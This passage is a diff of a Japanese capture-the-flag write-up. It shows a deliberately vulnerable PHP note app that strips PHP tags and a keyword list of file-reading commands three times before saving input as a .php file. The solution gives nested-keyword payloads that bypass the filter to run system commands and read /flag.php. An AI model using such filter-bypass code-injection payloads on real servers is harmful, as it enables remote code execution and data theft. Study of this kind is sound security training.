+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">generateRandomString</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">15</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$characters</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$charactersLength</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$randomString</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$randomString</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$charactersLength</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$randomString</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$originalstring</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;?php&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$originalstring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;?&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;?&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;fopen&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;fread&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;file_get_contents&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;fgets&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;cat&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;strings&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;less&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;more&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;head&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;tail&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;dd&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;cut&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;grep&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;tac&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;awk&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;sed&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$notetoadd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;notewrite&#34;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$newnote</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;notewrite&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//3rd times the charm and I&#39;ve learned my lesson. Now I&#39;ll make sure to filter more than once :)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$newnote</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$notetoadd</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">generateRandomString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;notes&#34;</span><span class="p">],</span> <span class="s2">&#34;</span><span class="si">$filename</span><span class="s2">.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$filename</span><span class="s2">.php&#34;</span><span class="p">,</span> <span class="nv">$notetoadd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:index.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <h3 id="solution-2">Solution</h3>
 <p>3回フィルターがかかるので、それを見越して文字列を組みます。</p>
 <p><code>&lt;&lt;&lt;&lt;???? syssyssyssystemtemtemtem(&quot;ls -al /&quot;); ????&gt;&gt;&gt;&gt;</code></p>
 <p>/flag.php があるのがわかるので、それを読みます。</p>
 <p><code>&lt;&lt;&lt;&lt;???? syssyssyssystemtemtemtem(&quot;cacacacatttt /flflflflagagagag.php&quot;); ????&gt;&gt;&gt;&gt;</code></p>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -597,7 +593,7 @@ kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -632,20 +628,21 @@ kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
